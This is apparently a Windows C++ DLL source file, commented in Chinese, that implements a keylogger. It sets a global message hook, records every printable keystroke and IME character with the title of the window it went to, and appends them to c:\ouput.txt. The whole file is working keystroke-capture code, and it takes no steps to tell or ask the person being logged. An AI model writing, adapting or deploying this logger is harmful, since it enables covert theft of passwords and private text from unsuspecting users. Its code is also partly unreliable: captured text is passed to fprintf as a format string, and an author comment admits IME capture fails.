// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include <windows.h>
#include <iostream>

HHOOK g_hHook = nullptr;
HINSTANCE g_hInstance = nullptr;



LRESULT CALLBACK MsgHookProc(int nCode, WPARAM wPARAM, LPARAM lParam)
{
	if (HC_ACTION == nCode) //说明有消息到来
	{
		PMSG pMsg = (PMSG)lParam;
		char szWindowName[MAXBYTE] = { 0 };
		char szOutput[MAXBYTE] = { 0 };
		char szOutput2[MAXBYTE] = { 0 };
		FILE *logfile;
		if (pMsg->message == WM_CHAR)//字符消息
		{
			//确定此时已经按下一个键
			char szKey = (char)pMsg->wParam;
			//MessageBox(nullptr, L"你按下了一个键", L"", MB_OK);
			if (szKey >= 32 && szKey <= 126) //有效字符消息 32到126之间
			{
				GetWindowTextA(pMsg->hwnd, szWindowName, MAXBYTE);//哪个窗口
				sprintf_s(szOutput, MAXBYTE, "窗口：[%s]接收到：%c\n", szWindowName, szKey);
				OutputDebugStringA(szOutput);
				fopen_s(&logfile, "c:\\ouput.txt", "a+");
				fprintf(logfile,szOutput);
				fclose(logfile);
			}

		}
		//////////////////////////////////////////////
		else if (pMsg->message == WM_IME_CHAR)//输入法消息
		{
			//确定此时已经按下一个键
			char szKey2 = (char)pMsg->wParam;
			GetWindowTextA(pMsg->hwnd, szWindowName, MAXBYTE);//哪个窗口
			sprintf_s(szOutput2, MAXBYTE, "窗口：[%s]接收到：%c\n", szWindowName, szKey2);
			OutputDebugStringA(szOutput2);
			fopen_s(&logfile, "c:\\ouput.txt", "a+");
			fprintf(logfile, szOutput2);
			fclose(logfile);
			//输入法的消息无法记录，原因不明。
		}

	}
	return CallNextHookEx(g_hHook, nCode, wPARAM, lParam);
}

extern "C"
_declspec(dllexport) BOOL StartHook()
{
	g_hHook = SetWindowsHookEx(WH_GETMESSAGE, MsgHookProc, g_hInstance, NULL);//回调函数
	if (g_hHook == nullptr)
	{
		unsigned long dwError = GetLastError();
		return FALSE;
	}
	return TRUE;
}
BOOL UnHook()
{
	if (g_hHook)
	{
		return UnhookWindowsHookEx(g_hHook);
	}
	return FALSE;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_hInstance = hModule;
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		UnHook();
		break;
	}
	return TRUE;
}

